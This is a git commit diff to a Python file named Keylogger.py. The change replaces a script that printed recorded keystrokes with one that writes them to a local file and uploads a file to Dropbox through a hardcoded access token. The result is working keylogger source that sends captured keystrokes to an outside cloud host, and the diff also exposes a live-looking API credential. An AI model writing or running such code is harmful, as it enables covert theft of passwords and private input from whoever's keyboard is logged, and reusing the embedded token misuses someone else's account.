8a433597a9218a2c679bddd5013211a7447736d8
Louis Friedrich <48963330+louisfrdrchcoding@users.noreply.github.com>
2019-10-14 13:21:57 +0200

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,5 +1,18 @@
+
 import keyboard
 
-events = keyboard.record(until="esc")     # recording keyboard until escape is pressed
+with open('test2', 'r+') as file:
+ events = keyboard.record(until="esc")
+ for i in events:
+    file.write(str(i))
 
-print(events)                             # printing it
+
+import dropbox
+
+db = dropbox.Dropbox('f-e8s_6DBjAAAAAAAAAAD9H3-dleMmv1AwiIPWsKRlFitP5S4sxq9Qq1lDVIl_DY')
+fname = 'test2.txt'
+dname = '/test2.txt'
+f = open(fname, 'rb')
+response = db.files_upload(f.read(), dname)
+print('upload:', response)
+f.close()
